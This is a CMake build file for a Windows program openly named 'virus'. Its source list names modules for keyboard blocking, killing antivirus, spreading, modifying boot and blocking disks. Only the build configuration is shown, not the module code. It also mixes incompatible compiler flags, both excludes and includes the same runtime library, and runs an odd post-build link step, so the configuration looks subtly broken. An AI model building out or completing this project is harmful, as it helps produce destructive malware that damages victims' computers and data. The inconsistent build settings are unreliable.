cmake_minimum_required(VERSION 3.10)
project(Virus)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Wall -Werror")
set(CMAKE_CXX_FLAGS_RELEASE "/O2 /MT")
set(CMAKE_CXX_FLAGS_DEBUG "/Od /MTd")

set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /SUBSYSTEM:WINDOWS")

add_executable(virus
    main.cpp
    screamer.cpp
    filesystem.cpp
    keyblock.cpp
    killav.cpp
    spread.cpp
    openrand.cpp
    bootmod.cpp
    diskblock.cpp  # НОВЫЙ ФАЙЛ
)

target_link_libraries(virus
    user32
    kernel32
    gdi32
    shell32
    advapi32
    shlwapi
    ole32
    oleaut32
)

target_compile_definitions(virus PRIVATE _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING)

set_target_properties(virus PROPERTIES
    LINK_FLAGS "/NODEFAULTLIB:libcmt /DEFAULTLIB:libcmt"
)

if(WIN32)
    add_custom_command(TARGET virus POST_BUILD
        COMMAND echo. > ${CMAKE_BINARY_DIR}/empty.rc
        COMMAND rc /fo ${CMAKE_BINARY_DIR}/empty.res ${CMAKE_BINARY_DIR}/empty.rc
        COMMAND link /LTCG ${CMAKE_BINARY_DIR}/empty.res
        COMMENT "Adding resources"
    )
endif()
